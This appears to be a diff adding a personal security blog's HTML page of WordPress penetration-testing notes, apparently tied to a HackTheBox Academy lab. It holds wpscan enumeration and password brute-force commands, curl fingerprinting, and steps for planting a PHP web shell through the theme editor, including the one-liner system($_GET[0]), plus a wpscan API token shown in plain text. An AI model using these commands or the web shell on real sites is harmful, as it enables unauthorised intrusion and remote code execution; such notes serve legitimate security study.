@@ -1,0 +1,266 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+	<div class="row page">
+		<!-- cols -->
+		
+					<div class="col-md-12">
+						
+
+							<!-- content -->
+							<div class="mypage">
+								
+
+										<p>check <code>/robots.txt</code><br>check <code>/wp-login, /wp-admin</code><br>run wpscan default<br>run wpscan agressive<br>run dirbuster backup discovery mode<br>enumerate users</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">scan themes, plugins, enumerate <span class="built_in">users</span></span></span><br><span class="line">wpscan --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs -e u -t 500 --url http://ir.ad.someorg.local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">agressive mode (run <span class="keyword">in</span> background)</span></span><br><span class="line">wpscan --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs --url http://xxx -e ap --plugins-detection aggressive</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">backup discovery</span></span><br><span class="line">gobuster discover backup mode:</span><br><span class="line">gobuster -u url -w lst.txt -d</span><br><span class="line">-d =&gt; backup discovery</span><br></pre></td></tr></table></figure>
+
+<p>launch a bruteforce attack against a single user</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs --url http://ir.ad.someorg.local -P passwords.txt -U ilsomeorg.localwp</span><br></pre></td></tr></table></figure>
+<p>wordlist<br>Passwords&#x2F;Common-Credentials&#x2F;darkweb2017_top-100.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -s http://blog.ad.someorg.local | grep WordPress</span><br><span class="line"></span><br><span class="line">&lt;meta name=&quot;generator&quot; content=&quot;WordPress 5.8&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Themes"><a href="#Themes" class="headerlink" title="Themes&#96;"></a>Themes&#96;</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -s http://blog.ad.someorg.local | grep themes</span><br></pre></td></tr></table></figure>
+
+<h4 id="what-plugins-installed"><a href="#what-plugins-installed" class="headerlink" title="what plugins installed?"></a>what plugins installed?</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> curl -s http://blog.ad.someorg.local | grep plugins</span><br><span class="line">&lt;link  id=&#x27;contact-form-7-css&#x27; /plugins/contact-form-7/i&#x27; </span><br><span class="line">&lt;link rel=&#x27;stylesheet&#x27; id=&#x27;wpdiscuz-frontend-css-css&#x27; </span><br></pre></td></tr></table></figure>
+<p> look for CVEs on them.</p>
+<h2 id="what-users-exist"><a href="#what-users-exist" class="headerlink" title="what users exist?"></a>what users exist?</h2><p>The <code>--enumerate</code> flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups.<br><code>run wpscan in docker</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -it --rm --network host wpscanteam/wpscan --url http://blog.ad.someorg.local --enumerate --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><code>wpscan password bruteforce</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.ad.someorg.local</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br><code>lab</code><br><img src="/Pasted%20image%2020250211132204.png"><br>after browsing the readme, mail-masta 1 is in use.</p>
+<p><code>run wpscan in docker</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo docker run -it --rm --network host wpscanteam/wpscan --url http://blog.ad.someorg.local --enumerate --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h2 id="Some-notes-that-might-help-you"><a href="#Some-notes-that-might-help-you" class="headerlink" title="Some notes that might help you"></a>Some notes that might help you</h2><p>WordPress stores its plugins in the <code>wp-content/plugins</code> directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the <code>wp-content/themes</code> directory. These files should be carefully enumerated as they may lead to RCE.</p>
+<h1 id="AUTHORIZATION-LEVELS"><a href="#AUTHORIZATION-LEVELS" class="headerlink" title="AUTHORIZATION LEVELS"></a>AUTHORIZATION LEVELS</h1><p>There are five types of users on a standard WordPress installation.</p>
+<ol>
+<li>Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</li>
+<li>Editor: An editor can publish and manage posts, including the posts of other users.</li>
+<li>Author: They can publish and manage their own posts.</li>
+<li>Contributor: These users can write and manage their own posts but cannot publish them.</li>
+<li>Subscriber: These are standard users who can browse posts and edit their profiles.</li>
+</ol>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell:"></a>webshell:</h2><ol>
+<li>manual with twentyone</li>
+<li>auto with metasploit</li>
+</ol>
+<p>browse to <code>http://ir.ad.someorg.local/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwenty</code> to edit the 404.php file for the inactive theme <code>Twenty Twenty</code> and add in a PHP web shell to get remote code execution. After editing this page and achieving code execution following the steps in the <a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/113/section/1208">Attacking WordPress</a> section of the <code>Attacking Common Applications</code><br>we can record yet another finding for <code>Weak WordPress Admin Credentials</code> and recommend that our client implement several hardening measures if they plan to leave this WordPress site exposed externally.</p>
+<h3 id="WP-Webshells"><a href="#WP-Webshells" class="headerlink" title="WP Webshells"></a>WP Webshells</h3><h4 id="Creating-a-webshell-using-the-php-module"><a href="#Creating-a-webshell-using-the-php-module" class="headerlink" title="Creating a webshell using the php module"></a>Creating a webshell using the php module</h4><p>select an unused theme and an unusual page, <code>404.php</code> select ninteen and 404<br><img src="/Pasted%20image%2020250211200810.png"></p>
+<h5 id="Simple-test"><a href="#Simple-test" class="headerlink" title="Simple test"></a>Simple test</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
+
+<h4 id="interactive-webshell"><a href="#interactive-webshell" class="headerlink" title="interactive webshell"></a>interactive webshell</h4>
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
